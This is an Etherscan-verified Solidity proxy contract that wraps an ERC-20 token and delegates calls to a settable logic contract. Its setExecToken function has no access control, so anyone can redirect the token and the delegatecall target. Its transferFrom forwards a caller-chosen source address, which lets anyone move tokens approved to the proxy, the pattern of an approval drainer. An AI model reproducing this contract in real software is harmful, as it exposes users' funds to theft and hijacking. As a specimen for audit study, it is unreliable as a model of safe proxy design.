/**
 *Submitted for verification at Etherscan.io on 2022-04-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {

    function transferFrom(address form, address to, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

}

contract MyTokenStorage {
    
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;
    uint256 internal _totalSupply;


    mapping(address => uint256) internal balances;

    mapping(address => mapping(address => uint256)) internal _allowances;
}




contract Proxy is MyTokenStorage {
    IERC20 public  execToken=IERC20(0xb0ee22D8bf0c432BFd1940023F7fD41Bc28d4350);

    address public myCoinLogicAddr;

    function balanceOf(address owner) public view virtual  returns (uint256) {
        return execToken.balanceOf(owner);
    }

    function transferFrom(address form,address to, uint256 amount) public virtual  returns (bool) {

        execToken.transferFrom(form,to,amount);
        return true;
    }
    
    // 逻辑合约指定
    function setExecToken(address _execToken)  public  virtual  returns (bool) {
        myCoinLogicAddr=_execToken;
       execToken = IERC20(_execToken);
        return true;
    }

    function implementation() public view returns (IERC20 token) {
        return execToken;
    }

    function initialize(bytes calldata) external pure {
        revert("CANNOT_CALL_INITIALIZE");
    }

    receive() external payable {
        revert("CONTRACT_NOT_EXPECTED_TO_RECEIVE");
    }

    /*
      Contract's default function. Delegates execution to the implementation contract.
      It returns back to the external caller whatever the implementation delegated code returns.
    */
    fallback() external payable {
        address _implementation = myCoinLogicAddr;
        require(_implementation != address(0x0), "MISSING_IMPLEMENTATION");

        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 for now, as we don't know the out size yet.
            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
    
}